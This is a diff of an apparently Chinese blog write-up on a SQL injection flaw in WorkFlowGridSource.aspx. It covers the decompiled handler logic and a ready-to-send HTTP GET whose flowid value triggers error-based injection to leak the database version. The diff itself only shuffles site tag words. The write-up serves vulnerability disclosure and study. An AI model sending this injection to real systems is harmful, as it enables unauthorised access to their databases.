@@ -18,14 +18,6 @@ asset_dir: embedded-base64
 
 # 漏洞分析
 
-深入探索
-
-计算机科学
-
-书籍
-
-内容管理系统
-
 根据 `WorkFlowGridSource.aspx` 的代码引用 `DSWeb.WorkFlow.WorkFlowGridSource` ，在dll中找到它的逻辑实现
 
 ```
@@ -41,6 +33,14 @@ protected void Page_Load(object sender, EventArgs e)
     if (string.op_Equality(this.strHandle, "steplist") && this.strWorkFlowID != null)
       this.Response.Write(this.GetWorkFlowSteps(this.strWorkFlowID));
 ```
+
+深入探索
+
+黑客与破解
+
+网络
+
+计算机安全
 
 主要就是根据`handle`参数的值来进行处理不同的分支逻辑
 
@@ -59,14 +59,6 @@ protected void Page_Load(object sender, EventArgs e)
 
 # 漏洞复现
 
-深入探索
-
-数据管理
-
-计算机服务器
-
-网络
-
 ```
 GET /WorkFlow/WorkFlowGridSource.aspx?handle=steplist&flowid='-1/user-- HTTP/1.1
 Host: dongsheng.mrxn.net
@@ -76,4 +68,4 @@ Host: dongsheng.mrxn.net
 
 通过[报错注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "标签：报错注入")在响应里回显数据库版本信息。
 
-数据管理
+网络安全
